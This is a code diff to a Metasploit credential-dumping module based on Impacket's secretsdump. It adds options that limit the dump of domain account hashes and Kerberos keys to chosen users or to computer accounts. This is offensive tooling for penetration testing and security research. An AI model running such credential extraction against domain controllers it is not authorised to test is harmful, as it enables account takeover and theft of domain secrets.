@@ -63,7 +63,8 @@ class MetasploitModule < Msf::Auxiliary
         'Author' => [
           'Alberto Solino', # Original Impacket code
           'Christophe De La Fuente', # MSF module
-          'antuache' # Inline technique
+          'antuache', # Inline technique
+          'smashery' # Querying subset of domain accounts
         ],
         'References' => [
           ['URL', 'https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py'],
@@ -91,7 +92,9 @@ class MetasploitModule < Msf::Auxiliary
           'INLINE',
           [ true, 'Use inline technique to read protected keys from the registry remotely without saving the hives to disk', true ],
           conditions: ['ACTION', 'in', %w[ALL SAM CACHE LSA]]
-        )
+        ),
+        OptEnum.new('KERBEROS_TYPES', [true, 'Which type of accounts to retrieve kerberos details for', 'ALL', ['ALL','USERS_ONLY','COMPUTERS_ONLY']], conditions: ['ACTION', 'in', %w[ALL DOMAIN]]),
+        OptString.new('KERBEROS_USERS', [false, 'Which specific accounts to retrieve kerberos details for', ''], conditions: ['ACTION', 'in', %w[ALL DOMAIN]])
       ]
     )
 
@@ -609,7 +612,14 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def get_domain_users
-    users = @samr.samr_enumerate_users_in_domain(domain_handle: @domain_handle)
+    user_uac = RubySMB::Dcerpc::Samr::USER_NORMAL_ACCOUNT
+    computer_uac = RubySMB::Dcerpc::Samr::USER_WORKSTATION_TRUST_ACCOUNT | RubySMB::Dcerpc::Samr::USER_SERVER_TRUST_ACCOUNT | RubySMB::Dcerpc::Samr::USER_INTERDOMAIN_TRUST_ACCOUNT
+    all_uac = user_uac | computer_uac
+    uac = {'ALL' => all_uac,
+           'USERS_ONLY' => user_uac,
+           'COMPUTERS_ONLY' => computer_uac
+          }[datastore['KERBEROS_TYPES']]
+    users = @samr.samr_enumerate_users_in_domain(domain_handle: @domain_handle, user_account_control: uac)
     vprint_status("Obtained #{users.length} domain users, fetching the SID for each...")
     progress_interval = 250
     nb_digits = (Math.log10(users.length) + 1).floor
@@ -830,6 +840,27 @@ class MetasploitModule < Msf::Auxiliary
     result
   end
 
+  def get_domain_users_by_name(names)
+    if datastore['KERBEROS_TYPES'] != 'ALL'
+      print_warning("Searching for specific users; KERBEROS_TYPES setting (#{datastore['KERBEROS_TYPES']}) will be ignored")
+    end
+
+    details = @samr.samr_lookup_names_in_domain(
+        domain_handle: @domain_handle,
+        names: names
+      )
+      raise Msf::Exploit::Remote::MsSamr::MsSamrNotFoundError, 'One or more of the provided names was not found.' if details.nil?
+
+    names.map do |name|
+      user_details = details[name]
+      sid = @samr.samr_rid_to_sid(
+        object_handle: @domain_handle,
+        rid: user_details[:rid]
+      ).to_s
+      [sid, name]
+    end
+  end
+
   def dump_ntds_hashes
     _machine_name, domain_name, dns_domain_name = get_machine_name_and_domain_info
     return unless domain_name
@@ -846,7 +877,12 @@ class MetasploitModule < Msf::Auxiliary
       )
       return
     end
-    users = get_domain_users
+    specific_users = datastore['KERBEROS_USERS'].strip.split(',')
+    if specific_users.length == 0
+      users = get_domain_users
+    else
+      users = get_domain_users_by_name(specific_users)
+    end
 
     dcerpc_client = connect_drs
     unless dcerpc_client
@@ -1219,6 +1255,8 @@ class MetasploitModule < Msf::Auxiliary
     fail_with(Module::Failure::UnexpectedReply, "[#{e.class}] #{e}")
   rescue Rex::ConnectionError => e
     fail_with(Module::Failure::Unreachable, "[#{e.class}] #{e}")
+  rescue Msf::Exploit::Remote::MsSamr::MsSamrError => e
+    fail_with(Module::Failure::BadConfig, "[#{e.class}] #{e}")
   rescue ::StandardError => e
     do_cleanup
     raise e
